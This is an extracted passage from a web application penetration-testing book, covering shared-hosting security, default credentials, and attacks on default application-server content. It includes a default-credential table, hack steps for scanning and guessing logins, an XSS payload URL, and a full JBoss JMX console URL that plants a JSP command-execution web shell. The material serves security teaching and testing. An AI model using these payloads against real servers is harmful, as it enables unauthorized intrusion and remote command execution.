Web Storage
Web storage is one of the main end-user attractions of cloud computing. To be
effective, web storage should support a standard browser or browser extension,
a range of technologies and extensions to HTTP such as WebDAV, and often
cached or token-based credentials, as just discussed.
Another issue is that a web server on a domain is often Internet-visible. If a
user can upload HTML and induce other users to access their upload fi le, he
can compromise those users of the same service. Similarly, an attacker can take
advantage of the Java same-origin policy and upload a JAR fi le, gaining full
two-way interaction whenever that JAR fi le is invoked elsewhere on the Internet.
Securing Shared Environments
Shared environments introduce new types of threats to an application’s security,
posed by a malicious customer of the same facility and by an unwitting customer
who introduces vulnerabilities into the environment. To address this twofold
danger, shared environments must be carefully designed in terms of customer
access, segregation, and trust. They also must implement controls that are not
directly applicable to the context of a single-hosted application.
Secure Customer Access
Whatever mechanism is provided for customers to maintain the content under
their control, this should protect against unauthorized access by third parties
and by malicious customers:
n The remote access mechanism should implement robust authentication,
use cryptographic technologies that are not vulnerable to eavesdropping,
and be fully security hardened.
n Individual customers should be granted access on a least-privilege basis.
For example, if a customer is uploading scripts to a virtually hosted server,
he should have only read and write permissions to his own document
root. If a shared database is being accessed, this should be done using
cc1177..iinndddd 666655 88//1199//22001111 1122::1177::1177 PPMM
Stuttard c17.indd V2 - 08/10/2011 Page 666
666 Chapter 17 n Attacking Application Architecture
a low-privileged account that cannot access data or other components
belonging to other customers.
n If a customized application is used to provide customer access, it should
be subjected to rigorous security requirements and testing in line with its
critical role in protecting the security of the shared environment.
Segregate Customer Functionality
Customers of a shared environment cannot be trusted to create only benign
functionality that is free of vulnerabilities. A robust solution, therefore, should
use the architectural controls described in the fi rst half of this chapter to protect
the shared environment and its customers from attack via rogue content. This
involves segregating the capabilities allowed to each customer’s code as follows
to ensure that any deliberate or unwitting compromise is localized in its impact
and cannot affect other customers:
n Each customer’s application should use a separate operating system
account to access the fi lesystem that has read and write access only to
that application’s fi le paths.
n The ability to access powerful system functions and commands should be
restricted at the operating system level on a least-privilege basis.
n The same protection should be implemented within any shared databases.
A separate database instance should be used for each customer, and low-
privileged accounts should be assigned to customers, with access to only
their own data.
NOTE Many shared hosting environments based on the LAMP model rely
on PHP’s safe mode to limit the potential impact of a malicious or vulner-
able script. This mode prevents PHP scripts from accessing certain powerful
PHP functions and places restrictions on the operation of other functions
(see Chapter 19). However, these restrictions are not fully effective and have
been vulnerable to bypasses. Although safe mode may provide a useful layer
of defense, it is architecturally the wrong place to control the impact of a
malicious or vulnerable application, because it involves the operating system
trusting the application tier to control its actions. For this reason and others,
safe mode has been removed from PHP version 6.
TIP If you can execute arbitrary PHP commands on a server, use the
phpinfo() command to return details of the PHP environment’s confi gu-
ration. You can review this information to establish whether safe mode is
enabled and how other confi guration options may affect what actions you can
easily perform. See Chapter 19 for further details.
cc1177..iinndddd 666666 88//1199//22001111 1122::1177::1177 PPMM
Stuttard c17.indd V2 - 08/10/2011 Page 667
Chapter 17 n Attacking Application Architecture 667
Segregate Components in a Shared Application
In an ASP environment where a single application comprises various shared
and customizable components, trust boundaries should be enforced between
components that are under the control of different parties. When a shared com-
ponent, such as a database stored procedure, receives data from a customized
component belonging to an individual customer, this data should be treated
with the same level of distrust as if it originated directly from an end user.
Each component should be subjected to rigorous security testing originating
from adjacent components outside its trust boundaries to identify any defects
that may enable a vulnerable or malicious component to compromise the wider
application. Particular attention should be paid to shared logging and admin-
istrative functions.
Summary
Security controls implemented within web application architectures present a
range of opportunities for application owners to enhance the overall security
posture of their deployment. As a consequence, defects and oversights within
an application’s architecture often can enable you to dramatically escalate an
attack, moving from one component to another to eventually compromise the
entire application.
Shared hosting and ASP-based environments present a new range of diffi cult
security problems, involving trust boundaries that do not arise within a single-
hosted application. When you are attacking an application in a shared context,
a key focus of your efforts should be the shared environment itself. You should
try to ascertain whether it is possible to compromise that environment from
within an individual application, or to leverage one vulnerable application to
attack others.
Questions
Answers can be found at http://mdsec.net/wahh.
1. You are attacking an application that employs two different servers: an
application server and a database server. You have discovered a vulner-
ability that allows you to execute arbitrary operating system commands
on the application server. Can you exploit this vulnerability to retrieve
sensitive application data held within the database?
2. In a different case, you have discovered a SQL injection fl aw that can be
exploited to execute arbitrary operating system commands on the database
cc1177..iinndddd 666677 88//1199//22001111 1122::1177::1177 PPMM
Stuttard c17.indd V2 - 08/10/2011 Page 668
668 Chapter 17 n Attacking Application Architecture
server. Can you leverage this vulnerability to compromise the application
server? For example, could you modify the application’s scripts held on
the application server, and the content returned to users?
3. You are attacking a web application that is hosted in a shared environment.
By taking out a contract with the ISP, you can acquire some web space on
the same server as your target, where you are permitted to upload PHP
scripts.
Can you exploit this situation to compromise the application you are
targeting?
4. The architecture components Linux, Apache, MySQL, and PHP are often
found installed on the same physical server. Why can this diminish the
security posture of the application’s architecture?
5. How could you look for evidence that the application you are attacking is
part of a wider application managed by an application service provider?
cc1177..iinndddd 666688 88//1199//22001111 1122::1177::1177 PPMM
Stuttard c18.indd V2 - 07/28/2011 Page 669
CHAPTER
18
Attacking the
Application Server
As with any kind of application, a web application depends on the other layers
of the technology stack that support it, including the application or web server,
operating system, and networking infrastructure. An attacker may target any
of these components. Compromising the technology on which an application
depends very often enables an attacker to fully compromise the application itself.
Most attacks in this category are outside the scope of a book about attacking web
applications. One exception to this is attacks that target the application and web
server layers, as well as any relevant application-layer defenses. Inline defenses
are commonly employed to help secure web applications and identify attacks.
Circumventing these defenses is a key step in compromising the application.
So far we have not drawn a distinction between a web server and an application
server, because the attacks have targeted application functionality, irrespective
of how it is provided. In reality, much of the presentation layer, communication
with back-end components, and the core security framework may be managed
by the application container. This may give additional scope to an attack. Clearly
any vulnerability in the technologies that deliver this framework will be of inter-
est to an attacker if they can be used to directly compromise the application.
This chapter focuses on ways of leveraging defects at the application server
layer from an Internet perspective to attack the web application running on it.
The vulnerabilities that you can exploit to attack application servers fall into two
broad categories: shortcomings in the server’s confi guration, and security fl aws
within application server software. A list of defects cannot be comprehensive,
669
cc1188..iinndddd 666699 88//1199//22001111 1122::1177::5511 PPMM
Stuttard c18.indd V2 - 07/28/2011 Page 670
670 Chapter 18 n Attacking the Application Server
because software of this type is liable to change over time. But the fl aws described
here illustrate the typical pitfalls awaiting any application implementing its own
native extensions, modules, or APIs, or reaching outside the application container.
This chapter also examines web application fi rewalls, describes their strengths
and weaknesses, and details ways in which they can often be circumvented to
deliver attacks.
Vulnerable Server Confi guration
Even the simplest of web servers comes with a wealth of confi guration options
that control its behavior. Historically, many servers have shipped with insecure
default options, which present opportunities for attack unless they are explicitly
hardened.
Default Credentials
Many web servers contain administrative interfaces that may be publicly acces-
sible. These may be located at a specifi c location within the web root or may run
on a different port, such as 8080 or 8443. Frequently, administrative interfaces
have default credentials that are well known and are not required to be changed
on installation.
Table 18-1 shows examples of default credentials on some of the most com-
monly encountered administrative interfaces.
Table 18-1: Default Credentials on Some Common Administrative Interfaces
USERNAME PASSWORD
admin (none)
Apache Tomcat tomcat tomcat
root root
Sun JavaServer admin admin
Netscape Enterprise Server admin admin
administrator administrator
anonymous (none)
Compaq Insight Manager user user
operator operator
user public
Zeus admin (none)
cc1188..iinndddd 667700 88//1199//22001111 1122::1177::5511 PPMM
70 Stuttard c18.indd V2 - 07/28/2011 Page 671
Chapter 18 n Attacking the Application Server 671
In addition to administrative interfaces on web servers, numerous devices, such
as switches, printers, and wireless access points, use web interfaces that have
default credentials that may not have been changed. The following resources
list default credentials for a large number of different technologies:
n www.cirt.net/passwords
n www.phenoelit-us.org/dpl/dpl.html
HACK STEPS
1. Review the results of your application mapping exercises to identify the
web server and other technologies in use that may contain accessible
administrative interfaces.
2. Perform a port scan of the web server to identify any administrative inter-
faces running on a different port to the main target application.
3. For any identified interfaces, consult the manufacturer’s documentation
and the listings of common passwords to obtain default credentials. Use
Metasploit’s built-in database to scan the server.
4. If the default credentials do not work, use the techniques described in
Chapter 6 to attempt to guess valid credentials.
5. If you gain access to an administrative interface, review the available
functionality, and determine whether this can be used to further compro-
mise the host and attack the main application.
Default Content
Most application servers ship with a range of default content and functionality
that you may be able to leverage to attack either the server itself or the main target
application. Here are some examples of default content that may be of interest:
n Debug and test functionality designed for use by administrators
n Sample functionality designed to demonstrate certain common tasks
n Powerful functions not intended for public use but unwittingly left
accessible
n Server manuals that may contain useful information that is specifi c to
the installation itself
Debug Functionality
Functionality designed for diagnostic use by administrators is often of great
value to an attacker. It may contain useful information about the confi guration
and runtime state of the server and applications running on it.
cc1188..iinndddd 667711 88//1199//22001111 1122::1177::5511 PPMM
Stuttard c18.indd V2 - 07/28/2011 Page 672
672 Chapter 18 n Attacking the Application Server
Figure 18-1 shows the default page phpinfo.php, which exists on many Apache
installations. This page simply executes the PHP function phpinfo() and returns
the output. It contains a wealth of information about the PHP environment,
confi guration settings, web server modules, and fi le paths.
Figure 18-1: The default page phpinfo.php
Sample Functionality
By default many servers include various sample scripts and pages designed to
demonstrate how certain application server functions and APIs can be used.
Typically, these are intended to be innocuous and to provide no opportunities
for an attacker. However, in practice this has not been the case, for two reasons:
n Many sample scripts contain security vulnerabilities that can be exploited
to perform actions not intended by the scripts’ authors.
n Many sample scripts actually implement functionality that is of direct
use to an attacker.
An example of the fi rst problem is the Dump Servlet included in Jetty ver-
sion 7.0.0. This servlet can be accessed from a URL such as /test/jsp/dump
.jsp. When it is accessed, it prints various details of the Jetty installation and
the current request, including the request query string. This allows for simple
cc1188..iinndddd 667722 88//1199//22001111 1122::1177::5511 PPMM
72 Stuttard c18.indd V2 - 07/28/2011 Page 673
Chapter 18 n Attacking the Application Server 673
cross-site scripting if an attacker simply includes script tags in the URL, such
as /test/jsp/dump.jsp?%3Cscript%3Ealert(%22xss%22)%3C/script%3E.
An example of the second problem is the Sessions Example script shipped
with Apache Tomcat. As shown in Figure 18-2, this can be used to get and set
arbitrary session variables. If an application running on the server stores sensitive
data in a user’s session, an attacker can view this and may be able to interfere
with the application’s processing by modifying its value.
Figure 18-2: The default Sessions Example script shipped with Apache Tomcat
Powerful Functions
Some web server software contains powerful functionality that is not intended
to be used by the public but that can be accessed by end users through some
means. In many cases application servers actually allow web archives (WAR
fi les) to be deployed over the same HTTP port as that used by the application
itself, given the correct administrative credentials. This deployment process for
an application server is a prime target for hackers. Common exploit frameworks
can automate the process of scanning for default credentials, uploading a web
archive containing a backdoor, and executing it to get a command shell on the
remote system, as shown in Figure 18-3.
cc1188..iinndddd 667733 88//1199//22001111 1122::1177::5511 PPMM
Stuttard c18.indd V2 - 07/28/2011 Page 674
674 Chapter 18 n Attacking the Application Server
Figure 18-3: Using Metasploit to compromise a vulnerable Tomcat server
JMX
The JMX console, installed by default within a JBoss installation, is a classic
example of powerful default content. The JMX console is described as a “raw
view into the microkernel of the JBoss Application Server.” In fact, it allows you
to access any Managed Beans within the JBoss Application Server directly. Due
to the sheer amount of functionality available, numerous security vulnerabilities
have been reported. Among the easiest to exploit is the ability to use the store
method within the DeploymentFileRepository to create a war fi le containing
a backdoor, as shown in Figure 18-4.
cc1188..iinndddd 667744 88//1199//22001111 1122::1177::5522 PPMM
74 Stuttard c18.indd V2 - 07/28/2011 Page 675
Chapter 18 n Attacking the Application Server 675
Figure 18-4: The JMX console contains functionality allowing arbitrary WAR files to
be deployed
For example, the following URL uploads a page called cmdshell.jsp contain-
ing a backdoor:
http://wahh-app.com:8080/jmx-console/HtmlAdaptor?action=invokeOpByName&name=
jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=
store&argType=java.lang.String&arg0=cmdshell.war&argType=
java.lang.String&arg1=cmdshell&argType=java.lang.String&arg2=
.jsp&argType=java.lang.String&arg3=%3C%25Runtime.getRuntime%28%29.exec
%28request.getParameter%28%22c%22%29%29%3B%25%3E%0A&argType=
boolean&arg4=True
As shown in Figure 18-5, this successfully creates a server-side backdoor that
executes the following code: